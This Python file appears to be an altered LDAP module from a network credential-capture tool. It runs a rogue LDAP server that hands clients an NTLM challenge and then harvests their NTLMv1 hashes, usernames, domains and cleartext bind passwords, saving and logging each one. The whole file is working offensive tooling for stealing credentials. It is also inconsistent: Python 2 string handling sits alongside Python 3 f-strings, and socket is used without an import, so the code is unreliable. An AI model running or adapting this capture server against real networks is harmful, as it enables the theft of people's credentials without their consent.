from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge
from utils import *
import struct

# This variable will collect all the output for HTML rendering
output_data = []

def ParseSearch(data):
	if re.search(r'(objectClass)', data):
		return str(LDAPSearchDefaultPacket(MessageIDASNStr=data[8:9]))
	elif re.search(r'(?i)(objectClass0*.*supportedCapabilities)', data):
		return str(LDAPSearchSupportedCapabilitiesPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))
	elif re.search(r'(?i)(objectClass0*.*supportedSASLMechanisms)', data):
		return str(LDAPSearchSupportedMechanismsPacket(MessageIDASNStr=data[8:9],MessageIDASN2Str=data[8:9]))

def ParseLDAPHash(data, client):
    SSPIStart = data[42:]
    LMhashLen = struct.unpack('<H', data[54:56])[0]

    if LMhashLen > 10:
        LMhashOffset = struct.unpack('<H', data[58:60])[0]
        LMHash = SSPIStart[LMhashOffset:LMhashOffset+LMhashLen].encode("hex").upper()

        NthashLen = struct.unpack('<H', data[64:66])[0]
        NthashOffset = struct.unpack('<H', data[66:68])[0]
        NtHash = SSPIStart[NthashOffset:NthashOffset+NthashLen].encode("hex").upper()

        DomainLen = struct.unpack('<H', data[72:74])[0]
        DomainOffset = struct.unpack('<H', data[74:76])[0]
        Domain = SSPIStart[DomainOffset:DomainOffset+DomainLen].replace('\x00', '')

        UserLen = struct.unpack('<H', data[80:82])[0]
        UserOffset = struct.unpack('<H', data[82:84])[0]
        User = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00', '')

        WriteHash = User + "::" + Domain + ":" + LMHash + ":" + NtHash + ":" + settings.Config.NumChal

        SaveToDb({
            'module': 'LDAP',
            'type': 'NTLMv1',
            'client': client,
            'user': Domain + '\\' + User,
            'hash': NtHash,
            'fullhash': WriteHash,
        })

        output_data.append(f"[LDAP] NTLMv1 hash captured from {client}: {WriteHash}")

    elif LMhashLen < 2 and settings.Config.Verbose:
        output_data.append("[LDAP] Ignoring anonymous NTLM authentication")

def ParseNTLM(data, client):
    if re.search('(NTLMSSP\x00\x01\x00\x00\x00)', data):
        NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=data[8:9], NTLMSSPNtServerChallenge=settings.Config.Challenge)
        NTLMChall.calculate()
        return str(NTLMChall)
    elif re.search('(NTLMSSP\x00\x03\x00\x00\x00)', data):
        ParseLDAPHash(data, client)

def ParseLDAPPacket(data, client):
    if data[1:2] == '\x84':
        PacketLen = struct.unpack('>i', data[2:6])[0]
        MessageSequence = struct.unpack('<b', data[8:9])[0]
        Operation = data[9:10]
        sasl = data[20:21]
        OperationHeadLen = struct.unpack('>i', data[11:15])[0]
        LDAPVersion = struct.unpack('<b', data[17:18])[0]

        if Operation == "\x60":
            UserDomainLen = struct.unpack('<b', data[19:20])[0]
            UserDomain = data[20:20+UserDomainLen]
            AuthHeaderType = data[20+UserDomainLen:20+UserDomainLen+1]

            if AuthHeaderType == "\x80":
                PassLen = struct.unpack('<b', data[20+UserDomainLen+1:20+UserDomainLen+2])[0]
                Password = data[20+UserDomainLen+2:20+UserDomainLen+2+PassLen]
                SaveToDb({
                    'module': 'LDAP',
                    'type': 'Cleartext',
                    'client': client,
                    'user': UserDomain,
                    'cleartext': Password,
                    'fullhash': UserDomain + ':' + Password,
                })
                output_data.append(f"[LDAP] Cleartext credentials captured: {UserDomain}:{Password}")

            if sasl == "\xA3":
                Buffer = ParseNTLM(data, client)
                return Buffer

        elif Operation == "\x63":
            Buffer = ParseSearch(data)
            return Buffer
        elif settings.Config.Verbose:
            output_data.append('[LDAP] Operation not supported')

class LDAP(BaseRequestHandler):
    def handle(self):
        global output_data
        output_data = []  # Clear previous data

        try:
            while True:
                self.request.settimeout(0.5)
                data = self.request.recv(8092)
                Buffer = ParseLDAPPacket(data, self.client_address[0])

                if Buffer:
                    self.request.send(Buffer)
                    output_data.append(f"[LDAP] Data sent to {self.client_address[0]}")
        except socket.timeout:
            output_data.append(f"[LDAP] Timeout with {self.client_address[0]}")

        return output_data